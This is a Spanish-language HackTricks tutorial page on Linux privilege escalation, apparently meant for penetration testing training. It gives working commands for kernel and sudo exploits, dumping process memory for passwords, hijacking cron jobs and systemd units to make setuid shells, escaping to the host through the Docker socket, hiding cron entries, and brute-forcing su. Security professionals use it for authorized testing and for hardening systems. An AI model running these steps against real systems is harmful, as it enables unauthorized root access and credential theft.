# Escalación de Privilegios en Linux

{{#include ../../banners/hacktricks-training.md}}

## Información del Sistema

### Información del SO

Comencemos a obtener información sobre el SO en ejecución
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Ruta

Si **tienes permisos de escritura en alguna carpeta dentro de la variable `PATH`** es posible que puedas secuestrar algunas bibliotecas o binarios:
```bash
echo $PATH
```
### Info del entorno

¿Información interesante, contraseñas o claves API en las variables de entorno?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Verifica la versión del kernel y si hay algún exploit que se pueda utilizar para escalar privilegios.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Puedes encontrar una buena lista de núcleos vulnerables y algunos **exploits compilados** aquí: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) y [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Otros sitios donde puedes encontrar algunos **exploits compilados**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Para extraer todas las versiones vulnerables del núcleo de esa web, puedes hacer:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Las herramientas que podrían ayudar a buscar exploits del kernel son:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (ejecutar EN la víctima, solo verifica exploits para el kernel 2.x)

Siempre **busca la versión del kernel en Google**, tal vez tu versión del kernel esté escrita en algún exploit del kernel y así estarás seguro de que este exploit es válido.

### CVE-2016-5195 (DirtyCow)

Escalación de privilegios en Linux - Kernel de Linux <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Versión de Sudo

Basado en las versiones vulnerables de sudo que aparecen en:
```bash
searchsploit sudo
```
Puedes verificar si la versión de sudo es vulnerable usando este grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

De @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg la verificación de firma falló

Consulta la **caja smasher2 de HTB** para un **ejemplo** de cómo se podría explotar esta vulnerabilidad.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Más enumeración del sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Enumerar posibles defensas

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Si estás dentro de un contenedor de docker, puedes intentar escapar de él:

{{#ref}}
docker-security/
{{#endref}}

## Drives

Verifica **qué está montado y desmontado**, dónde y por qué. Si algo está desmontado, podrías intentar montarlo y buscar información privada.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Software útil

Enumera binarios útiles
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
También, verifica si **algún compilador está instalado**. Esto es útil si necesitas usar algún exploit del kernel, ya que se recomienda compilarlo en la máquina donde lo vas a usar (o en una similar).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software Vulnerable Instalado

Verifique la **versión de los paquetes y servicios instalados**. Tal vez haya alguna versión antigua de Nagios (por ejemplo) que podría ser explotada para escalar privilegios…\
Se recomienda verificar manualmente la versión del software instalado más sospechoso.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Si tienes acceso SSH a la máquina, también podrías usar **openVAS** para verificar si hay software desactualizado y vulnerable instalado en la máquina.

> [!NOTE] > _Ten en cuenta que estos comandos mostrarán mucha información que en su mayoría será inútil, por lo tanto, se recomienda algunas aplicaciones como OpenVAS o similares que verificarán si alguna versión de software instalada es vulnerable a exploits conocidos._

## Procesos

Echa un vistazo a **qué procesos** se están ejecutando y verifica si algún proceso tiene **más privilegios de los que debería** (¿quizás un tomcat ejecutado por root?)
```bash
ps aux
ps -ef
top -n 1
```
Siempre verifica si hay posibles [**electron/cef/chromium debuggers**] corriendo, podrías abusar de ello para escalar privilegios](electron-cef-chromium-debugger-abuse.md). **Linpeas** los detecta revisando el parámetro `--inspect` dentro de la línea de comandos del proceso.\
También **verifica tus privilegios sobre los binarios de los procesos**, tal vez puedas sobrescribir a alguien.

### Monitoreo de procesos

Puedes usar herramientas como [**pspy**](https://github.com/DominicBreuker/pspy) para monitorear procesos. Esto puede ser muy útil para identificar procesos vulnerables que se están ejecutando con frecuencia o cuando se cumplen un conjunto de requisitos.

### Memoria del proceso

Algunos servicios de un servidor guardan **credenciales en texto claro dentro de la memoria**.\
Normalmente necesitarás **privilegios de root** para leer la memoria de procesos que pertenecen a otros usuarios, por lo tanto, esto suele ser más útil cuando ya eres root y quieres descubrir más credenciales.\
Sin embargo, recuerda que **como usuario regular puedes leer la memoria de los procesos que posees**.

> [!WARNING]
> Ten en cuenta que hoy en día la mayoría de las máquinas **no permiten ptrace por defecto**, lo que significa que no puedes volcar otros procesos que pertenecen a tu usuario sin privilegios.
>
> El archivo _**/proc/sys/kernel/yama/ptrace_scope**_ controla la accesibilidad de ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: todos los procesos pueden ser depurados, siempre que tengan el mismo uid. Esta es la forma clásica en que funcionaba el ptracing.
> - **kernel.yama.ptrace_scope = 1**: solo un proceso padre puede ser depurado.
> - **kernel.yama.ptrace_scope = 2**: solo el administrador puede usar ptrace, ya que requiere la capacidad CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: No se pueden rastrear procesos con ptrace. Una vez establecido, se necesita un reinicio para habilitar el ptracing nuevamente.

#### GDB

Si tienes acceso a la memoria de un servicio FTP (por ejemplo), podrías obtener el Heap y buscar dentro de sus credenciales.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Script de GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Para un ID de proceso dado, **maps muestra cómo se mapea la memoria dentro del espacio de direcciones virtuales de ese proceso**; también muestra los **permisos de cada región mapeada**. El **archivo pseudo mem expone la memoria de los procesos**. A partir del archivo **maps** sabemos qué **regiones de memoria son legibles** y sus desplazamientos. Usamos esta información para **buscar en el archivo mem y volcar todas las regiones legibles** a un archivo.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` proporciona acceso a la **memoria** física del sistema, no a la memoria virtual. El espacio de direcciones virtual del kernel se puede acceder utilizando /dev/kmem.\
Típicamente, `/dev/mem` solo es legible por **root** y el grupo **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump para linux

ProcDump es una reinterpretación de Linux de la clásica herramienta ProcDump de la suite de herramientas Sysinternals para Windows. Consíguelo en [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Herramientas

Para volcar la memoria de un proceso, podrías usar:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Puedes eliminar manualmente los requisitos de root y volcar el proceso que te pertenece
- Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (se requiere root)

### Credenciales de la memoria del proceso

#### Ejemplo manual

Si encuentras que el proceso de autenticación está en ejecución:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Puedes volcar el proceso (consulta las secciones anteriores para encontrar diferentes formas de volcar la memoria de un proceso) y buscar credenciales dentro de la memoria:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

La herramienta [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **robará credenciales en texto claro de la memoria** y de algunos **archivos bien conocidos**. Requiere privilegios de root para funcionar correctamente.

| Característica                                     | Nombre del Proceso   |
| -------------------------------------------------- | -------------------- |
| Contraseña de GDM (Kali Desktop, Debian Desktop)   | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop)  | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                           | lightdm              |
| VSFTPd (Conexiones FTP Activas)                    | vsftpd               |
| Apache2 (Sesiones HTTP Basic Auth Activas)         | apache2              |
| OpenSSH (Sesiones SSH Activas - Uso de Sudo)       | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Trabajos programados/Cron

Verifica si algún trabajo programado es vulnerable. Tal vez puedas aprovechar un script que está siendo ejecutado por root (¿vulnerabilidad de comodín? ¿puede modificar archivos que usa root? ¿usar enlaces simbólicos? ¿crear archivos específicos en el directorio que usa root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Ruta de Cron

Por ejemplo, dentro de _/etc/crontab_ puedes encontrar la RUTA: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Nota cómo el usuario "user" tiene privilegios de escritura sobre /home/user_)

Si dentro de este crontab el usuario root intenta ejecutar algún comando o script sin establecer la ruta. Por ejemplo: _\* \* \* \* root overwrite.sh_\
Entonces, puedes obtener un shell de root usando:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron usando un script con un comodín (Inyección de comodín)

Si un script ejecutado por root tiene un “**\***” dentro de un comando, podrías explotar esto para hacer cosas inesperadas (como privesc). Ejemplo:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Si el comodín está precedido por una ruta como** _**/some/path/\***_ **, no es vulnerable (incluso** _**./\***_ **no lo es).**

Lee la siguiente página para más trucos de explotación de comodines:

{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Sobrescritura de script de Cron y symlink

Si **puedes modificar un script de cron** ejecutado por root, puedes obtener un shell muy fácilmente:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Si el script ejecutado por root utiliza un **directorio donde tienes acceso total**, tal vez podría ser útil eliminar esa carpeta y **crear un enlace simbólico a otra** que sirva un script controlado por ti.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Trabajos cron frecuentes

Puedes monitorear los procesos para buscar procesos que se están ejecutando cada 1, 2 o 5 minutos. Tal vez puedas aprovechar esto y escalar privilegios.

Por ejemplo, para **monitorear cada 0.1s durante 1 minuto**, **ordenar por los comandos menos ejecutados** y eliminar los comandos que se han ejecutado más, puedes hacer:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**También puedes usar** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (esto monitoreará y listará cada proceso que inicie).

### Trabajos cron invisibles

Es posible crear un cronjob **poniendo un retorno de carro después de un comentario** (sin carácter de nueva línea), y el trabajo cron funcionará. Ejemplo (nota el carácter de retorno de carro):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servicios

### Archivos _.service_ escribibles

Verifica si puedes escribir en algún archivo `.service`, si puedes, **podrías modificarlo** para que **ejecute** tu **puerta trasera cuando** el servicio sea **iniciado**, **reiniciado** o **detenido** (quizás necesites esperar hasta que la máquina se reinicie).\
Por ejemplo, crea tu puerta trasera dentro del archivo .service con **`ExecStart=/tmp/script.sh`**

### Binarios de servicio escribibles

Ten en cuenta que si tienes **permisos de escritura sobre los binarios que son ejecutados por servicios**, puedes cambiarlos por puertas traseras para que cuando los servicios se vuelvan a ejecutar, las puertas traseras sean ejecutadas.

### systemd PATH - Rutas relativas

Puedes ver el PATH utilizado por **systemd** con:
```bash
systemctl show-environment
```
Si encuentras que puedes **escribir** en cualquiera de las carpetas de la ruta, es posible que puedas **escalar privilegios**. Necesitas buscar **rutas relativas que se utilizan en los archivos de configuración de servicios** como:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Luego, crea un **ejecutable** con el **mismo nombre que la ruta relativa del binario** dentro de la carpeta PATH de systemd en la que puedes escribir, y cuando se le pida al servicio que ejecute la acción vulnerable (**Iniciar**, **Detener**, **Recargar**), tu **puerta trasera se ejecutará** (los usuarios sin privilegios generalmente no pueden iniciar/detener servicios, pero verifica si puedes usar `sudo -l`).

**Aprende más sobre los servicios con `man systemd.service`.**

## **Temporizadores**

**Temporizadores** son archivos de unidad de systemd cuyo nombre termina en `**.timer**` que controlan archivos o eventos `**.service**`. **Temporizadores** se pueden usar como una alternativa a cron, ya que tienen soporte incorporado para eventos de tiempo calendario y eventos de tiempo monótono y se pueden ejecutar de forma asíncrona.

Puedes enumerar todos los temporizadores con:
```bash
systemctl list-timers --all
```
### Temporizadores escribibles

Si puedes modificar un temporizador, puedes hacer que ejecute algunas instancias de systemd.unit (como un `.service` o un `.target`)
```bash
Unit=backdoor.service
```
En la documentación puedes leer qué es la unidad:

> La unidad que se activa cuando se agota este temporizador. El argumento es un nombre de unidad, cuyo sufijo no es ".timer". Si no se especifica, este valor predeterminado es un servicio que tiene el mismo nombre que la unidad del temporizador, excepto por el sufijo. (Ver arriba.) Se recomienda que el nombre de la unidad que se activa y el nombre de la unidad del temporizador tengan el mismo nombre, excepto por el sufijo.

Por lo tanto, para abusar de este permiso necesitarías:

- Encontrar alguna unidad systemd (como un `.service`) que esté **ejecutando un binario escribible**
- Encontrar alguna unidad systemd que esté **ejecutando una ruta relativa** y que tengas **privilegios de escritura** sobre el **PATH de systemd** (para suplantar ese ejecutable)

**Aprende más sobre temporizadores con `man systemd.timer`.**

### **Habilitando el Temporizador**

Para habilitar un temporizador necesitas privilegios de root y ejecutar:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note que el **temporizador** se **activa** creando un symlink a él en `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Los Sockets de Dominio Unix (UDS) permiten la **comunicación entre procesos** en la misma o diferentes máquinas dentro de modelos cliente-servidor. Utilizan archivos de descriptor estándar de Unix para la comunicación entre computadoras y se configuran a través de archivos `.socket`.

Los sockets se pueden configurar utilizando archivos `.socket`.

**Aprende más sobre sockets con `man systemd.socket`.** Dentro de este archivo, se pueden configurar varios parámetros interesantes:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Estas opciones son diferentes, pero se utiliza un resumen para **indicar dónde va a escuchar** el socket (la ruta del archivo de socket AF_UNIX, la IPv4/6 y/o el número de puerto a escuchar, etc.)
- `Accept`: Toma un argumento booleano. Si es **true**, se **crea una instancia de servicio para cada conexión entrante** y solo se pasa el socket de conexión a ella. Si es **false**, todos los sockets de escucha se **pasan a la unidad de servicio iniciada**, y solo se crea una unidad de servicio para todas las conexiones. Este valor se ignora para sockets de datagramas y FIFOs donde una sola unidad de servicio maneja incondicionalmente todo el tráfico entrante. **Por defecto es false**. Por razones de rendimiento, se recomienda escribir nuevos demonios solo de una manera que sea adecuada para `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Toma una o más líneas de comando, que se **ejecutan antes** o **después** de que los **sockets**/FIFOs de escucha sean **creados** y vinculados, respectivamente. El primer token de la línea de comando debe ser un nombre de archivo absoluto, seguido de argumentos para el proceso.
- `ExecStopPre`, `ExecStopPost`: Comandos adicionales que se **ejecutan antes** o **después** de que los **sockets**/FIFOs de escucha sean **cerrados** y eliminados, respectivamente.
- `Service`: Especifica el nombre de la unidad de **servicio** **a activar** en el **tráfico entrante**. Esta configuración solo se permite para sockets con Accept=no. Por defecto, se utiliza el servicio que lleva el mismo nombre que el socket (con el sufijo reemplazado). En la mayoría de los casos, no debería ser necesario usar esta opción.

### Archivos .socket escribibles

Si encuentras un archivo `.socket` **escribible**, puedes **agregar** al principio de la sección `[Socket]` algo como: `ExecStartPre=/home/kali/sys/backdoor` y el backdoor se ejecutará antes de que se cree el socket. Por lo tanto, **probablemente necesitarás esperar hasta que la máquina se reinicie.**\
&#xNAN;_&#x4E;ote que el sistema debe estar utilizando esa configuración de archivo de socket o el backdoor no se ejecutará_

### Sockets escribibles

Si **identificas algún socket escribible** (_ahora estamos hablando de Sockets Unix y no de los archivos de configuración `.socket`_), entonces **puedes comunicarte** con ese socket y tal vez explotar una vulnerabilidad.

### Enumerar Sockets Unix
```bash
netstat -a -p --unix
```
### Conexión en bruto
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Ejemplo de explotación:**

{{#ref}}
socket-command-injection.md
{{#endref}}

### Sockets HTTP

Ten en cuenta que puede haber algunos **sockets escuchando solicitudes HTTP** (_no estoy hablando de archivos .socket, sino de los archivos que actúan como sockets unix_). Puedes verificar esto con:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Si el socket **responde con una solicitud HTTP**, entonces puedes **comunicarte** con él y tal vez **explotar alguna vulnerabilidad**.

### Socket de Docker Escribible

El socket de Docker, que a menudo se encuentra en `/var/run/docker.sock`, es un archivo crítico que debe ser asegurado. Por defecto, es escribible por el usuario `root` y los miembros del grupo `docker`. Poseer acceso de escritura a este socket puede llevar a la escalada de privilegios. Aquí hay un desglose de cómo se puede hacer esto y métodos alternativos si el CLI de Docker no está disponible.

#### **Escalada de Privilegios con Docker CLI**

Si tienes acceso de escritura al socket de Docker, puedes escalar privilegios utilizando los siguientes comandos:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Estos comandos te permiten ejecutar un contenedor con acceso a nivel de root al sistema de archivos del host.

#### **Usando la API de Docker Directamente**

En casos donde el CLI de Docker no está disponible, el socket de Docker aún puede ser manipulado usando la API de Docker y comandos `curl`.

1.  **Listar Imágenes de Docker:** Recupera la lista de imágenes disponibles.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Crear un Contenedor:** Envía una solicitud para crear un contenedor que monta el directorio raíz del sistema host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Inicia el contenedor recién creado:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Conectar al Contenedor:** Usa `socat` para establecer una conexión con el contenedor, habilitando la ejecución de comandos dentro de él.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Después de configurar la conexión `socat`, puedes ejecutar comandos directamente en el contenedor con acceso a nivel de root al sistema de archivos del host.

### Otros

Ten en cuenta que si tienes permisos de escritura sobre el socket de docker porque estás **dentro del grupo `docker`** tienes [**más formas de escalar privilegios**](interesting-groups-linux-pe/#docker-group). Si la [**API de docker está escuchando en un puerto** también puedes comprometerla](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Consulta **más formas de salir de docker o abusar de él para escalar privilegios** en:

{{#ref}}
docker-security/
{{#endref}}

## Escalación de privilegios de Containerd (ctr)

Si descubres que puedes usar el comando **`ctr`** lee la siguiente página ya que **puedes ser capaz de abusar de él para escalar privilegios**:

{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **Escalación de privilegios de RunC**

Si descubres que puedes usar el comando **`runc`** lee la siguiente página ya que **puedes ser capaz de abusar de él para escalar privilegios**:

{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus es un sofisticado **sistema de Comunicación entre Procesos (IPC)** que permite a las aplicaciones interactuar y compartir datos de manera eficiente. Diseñado con el sistema Linux moderno en mente, ofrece un marco robusto para diferentes formas de comunicación entre aplicaciones.

El sistema es versátil, soportando IPC básico que mejora el intercambio de datos entre procesos, reminiscentes de **sockets de dominio UNIX mejorados**. Además, ayuda en la transmisión de eventos o señales, fomentando una integración fluida entre los componentes del sistema. Por ejemplo, una señal de un demonio Bluetooth sobre una llamada entrante puede hacer que un reproductor de música se silencie, mejorando la experiencia del usuario. Además, D-Bus soporta un sistema de objetos remotos, simplificando las solicitudes de servicio y las invocaciones de métodos entre aplicaciones, agilizando procesos que tradicionalmente eran complejos.

D-Bus opera bajo un **modelo de permitir/denegar**, gestionando los permisos de mensajes (llamadas a métodos, emisiones de señales, etc.) basados en el efecto acumulativo de las reglas de política que coinciden. Estas políticas especifican interacciones con el bus, permitiendo potencialmente la escalación de privilegios a través de la explotación de estos permisos.

Se proporciona un ejemplo de tal política en `/etc/dbus-1/system.d/wpa_supplicant.conf`, detallando los permisos para que el usuario root posea, envíe y reciba mensajes de `fi.w1.wpa_supplicant1`.

Las políticas sin un usuario o grupo especificado se aplican de manera universal, mientras que las políticas de contexto "predeterminadas" se aplican a todos los que no están cubiertos por otras políticas específicas.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Aprende a enumerar y explotar una comunicación D-Bus aquí:**

{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Red**

Siempre es interesante enumerar la red y averiguar la posición de la máquina.

### Enumeración genérica
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Puertos abiertos

Siempre verifica los servicios de red que se están ejecutando en la máquina con la que no pudiste interactuar antes de acceder a ella:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Verifica si puedes interceptar tráfico. Si puedes, podrías ser capaz de obtener algunas credenciales.
```
timeout 1 tcpdump
```
## Usuarios

### Enumeración Genérica

Verifica **quién** eres, qué **privilegios** tienes, qué **usuarios** están en los sistemas, cuáles pueden **iniciar sesión** y cuáles tienen **privilegios de root:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Algunas versiones de Linux fueron afectadas por un error que permite a los usuarios con **UID > INT_MAX** escalar privilegios. Más información: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) y [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Explotarlo** usando: **`systemd-run -t /bin/bash`**

### Groups

Verifica si eres **miembro de algún grupo** que podría otorgarte privilegios de root:

{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Verifica si hay algo interesante ubicado dentro del portapapeles (si es posible)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Política de Contraseñas
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Contraseñas conocidas

Si **conoces alguna contraseña** del entorno **intenta iniciar sesión como cada usuario** usando la contraseña.

### Su Brute

Si no te importa hacer mucho ruido y los binarios `su` y `timeout` están presentes en la computadora, puedes intentar forzar la entrada de usuarios usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) con el parámetro `-a` también intenta forzar la entrada de usuarios.

